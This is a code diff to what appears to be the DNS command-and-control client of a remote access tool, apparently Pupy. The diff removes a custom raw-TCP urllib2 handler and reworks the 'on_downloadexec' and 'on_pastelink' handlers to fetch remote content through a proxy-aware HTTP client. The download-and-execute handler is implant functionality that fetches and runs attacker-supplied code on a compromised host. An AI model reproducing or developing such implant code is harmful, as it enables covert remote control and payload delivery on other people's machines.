@@ -15,62 +15,12 @@ import zlib
 import tempfile
 import subprocess
 import logging
-import urllib
-import urllib2
 
 from ecpv import ECPV
 from picocmd import *
 
 from threading import Thread, Lock
 from network.lib import tinyhttp
-
-class TCPFile(StringIO.StringIO):
-    pass
-
-class TCPReaderHandler(urllib2.BaseHandler):
-    def tcp_open(self, req):
-        addr = req.get_host().rsplit(':', 1)
-        host = addr[0]
-        if len(addr) == 1:
-            port = 53
-        else:
-            port = addr[1]
-
-        data = []
-        conn = socket.create_connection((host, port))
-        conn.settimeout(30)
-
-        try:
-            while True:
-                b = conn.recv(65535)
-                if not b:
-                    break
-
-                data.append(b)
-
-            if not data:
-                raise ValueError('No data')
-        except:
-            pass
-
-        data = b''.join(data)
-
-        fp = TCPFile(data)
-        if data:
-            headers = {
-                'Content-type': 'application/octet-stream',
-                'Content-length': len(data),
-            }
-            code = 200
-        else:
-            headers = {}
-            code = 404
-
-        return urllib.addinfourl(fp, headers, req.get_full_url(), code=code)
-
-urllib2.install_opener(
-    urllib2.build_opener(TCPReaderHandler())
-)
 
 class DnsCommandClientDecodingError(Exception):
     pass
@@ -239,7 +189,7 @@ class DnsCommandsClient(Thread):
         return response.commands
 
     def on_pastelink(self, url, action, encoder):
-        http = tinyhttp.HTTP(follow_redirects=True)
+        http = tinyhttp.HTTP(proxy=self.proxy, follow_redirects=True)
         content, code = http.get(url, code=True)
         if code == 200:
             try:
@@ -258,15 +208,15 @@ class DnsCommandsClient(Thread):
                 logging.exception(e)
 
     def on_downloadexec(self, url, action, use_proxy):
-        if use_proxy:
-            opener = urllib2.build_opener(urllib2.ProxyHandler()).open
-        else:
-            opener = urllib2.urlopen
-
         try:
-            response = opener(url)
-            if response.code == 200:
-                self.on_downloadexec_content(url, action, response.read())
+            http = tinyhttp.HTTP(
+                proxy=self.proxy if use_proxy else False,
+                follow_redirects=True
+            )
+
+            content, code = http.get(url, code=True)
+            if code == 200:
+                self.on_downloadexec_content(url, action, content)
 
         except Exception as e:
             logging.exception(e)
